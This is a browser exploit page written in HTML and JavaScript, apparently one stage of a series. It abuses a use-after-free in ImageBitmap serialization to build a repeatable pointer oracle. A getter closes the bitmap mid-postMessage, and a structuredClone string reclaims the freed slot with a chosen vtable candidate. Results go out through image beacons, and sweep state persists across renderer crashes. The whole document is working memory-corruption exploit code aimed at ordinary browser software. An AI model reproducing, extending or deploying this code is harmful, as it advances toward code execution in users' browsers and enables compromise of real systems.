<!doctype html>
<meta charset="utf-8">
<title>caps18 — pointer oracle over the docs/94 ImageBitmap slot</title>
<body><p id="p">caps18</p>
<script>
// docs/101.  docs/94 made element+8 of the disengaged ImageBitmapBacking a page-chosen 56-bit value by
// leaving its own serialize buffer on the class-32 free list (a structuredClone string).  This page turns
// that into a *repeatable oracle*: put a candidate 8-byte value at element+8 and report what the engine did
// with it.
//
//   candidate is not a valid SerializedImageBuffer vptr -> SEGV, ASAN names the address (canonical values)
//                                                          or prints the pc-only form (non-canonical)
//   candidate is a valid vptr                          -> the virtual call returns, ImageBitmap::create
//                                                          runs, the message ARRIVES and the page reads w/h
//   0                                                  -> ImageBitmapBacking.cpp:83 early return, arrives detached
//
// Encoding: the stream is [ver:4][StringTag:1][len|8Bit:4][chars], so element+8 is the length MSB and the
// pointer's low byte is therefore 0x00; chars[0..6] fill the other seven bytes.  A candidate must be
// 256-aligned to be representable.  A 16-bit string (4 units) gives a 25-byte stream = class 32.
//
// state survives a WebProcess crash in localStorage, so a sweep continues instead of restarting.
// knobs: p=<hex> one candidate | list=<hex,hex,...> sweep them from idx=<i> | quiet=1 (no in-walk beacon)
(function () {
  'use strict';
  function B(m, x) { try { (new Image()).src = '/ev?m=' + encodeURIComponent(String(m)) + (x ? '&' + x : ''); } catch (e) {} }
  var Q = new URLSearchParams(location.search);
  function K(k, d) { return Q.has(k) ? Q.get(k) : d; }

  var P    = K('p', '');
  var LIST = K('list', '');
  var IDX  = parseInt(K('i', '0'), 10) || 0;
  var QUIET = K('quiet', '0') === '1';
  var KEY = 'caps18.idx';

  // ---- pointer <-> 4 UTF-16 units -------------------------------------------------
  function unitsFromHex(h) {
    h = h.replace(/^0x/i, '').replace(/_/g, '');
    while (h.length < 16) h = '0' + h;
    var b = [];
    for (var i = 14; i >= 0; i -= 2) b.push(parseInt(h.substr(i, 2), 16));   // little-endian bytes
    // pointer = [0x00][b1..b7]  ->  b0 must be 0
    if (b[0] !== 0) return null;
    // 16-bit chars, so each unit is two consecutive bytes: (b1,b2) (b3,b4) (b5,b6) (b7, lenMSB=0x00)
    return [b[1] | (b[2] << 8), b[3] | (b[4] << 8), b[5] | (b[6] << 8), b[7]];
  }

  function next() {
    var p = P, i = IDX;
    if (!p && LIST) {
      var l = LIST.split(',');
      var st = parseInt(localStorage.getItem(KEY) || '0', 10) || 0;
      if (Q.has('i')) st = IDX;
      if (st >= l.length) { B('sweepdone', 'n=' + l.length); return; }
      p = l[st]; i = st;
      localStorage.setItem(KEY, String(st + 1));
    }
    if (!p) { B('nop', 'x=1'); return; }
    B('try', 'p=' + p + '&i=' + i + '&n=' + localStorage.getItem(KEY));
    var u = unitsFromHex(p);
    if (!u) { B('badp', 'p=' + p + '&why=not256aligned'); return; }
    // 5th unit U+0100 sits past the 8 pointer bytes and forces a 16-bit string, so element+8 keeps
    // the pointer's 0x00 low byte (an all-ASCII payload would serialise 8-bit and shift it to 0x80)
    var ss = String.fromCharCode(u[0], u[1], u[2], u[3], 0x0100);   // built BEFORE the walk

    var cvs = document.createElement('canvas'); cvs.width = 4; cvs.height = 4;
    createImageBitmap(cvs).then(function (bmp) {
      var ch = new MessageChannel(), got = false;
      ch.port2.onmessage = function (ev) {
        if (got) return; got = true;
        var d = ev.data, b = d && d.k;
        var w = -1, h = -1;
        try { w = b ? b.width : -1; h = b ? b.height : -1; } catch (e) {}
        B('ok', 'p=' + p + '&i=' + i + '&det=' + (b ? 0 : -1) + '&w=' + w + '&h=' + h);
        if (LIST) setTimeout(next, 60);
      };
      // property order matters: `pad` first grows the message buffer past class 32, `k` is the
      // bitmap, `g` is LAST so its frees are the final class-32 frees of the walk.
      var msg = { pad: 'x'.repeat(200), k: bmp };
      // the getter sits on a *nested* object (as in caps14): the walk descends into g and the clone is
      // the last class-32 free before the two endObject() writes
      msg.g = { get z() {
        try { bmp.close(); } catch (e) {}
        if (!QUIET) B('closed', 'p=' + p);
        var o = structuredClone(ss);        // its 25-byte serialize buffer is the slot
        return o.length;
      } };
      try { ch.port1.postMessage(msg, [bmp]); }
      catch (e) { B('postfail', 'p=' + p + '&e=' + e.name); if (LIST) setTimeout(next, 60); }
      setTimeout(function () { if (!got) B('to', 'p=' + p + '&i=' + i); }, 3000);
    }, function (e) { B('bmpfail', 'e=' + (e && e.name)); });
  }

  setTimeout(next, 120);
})();
</script>
</body>
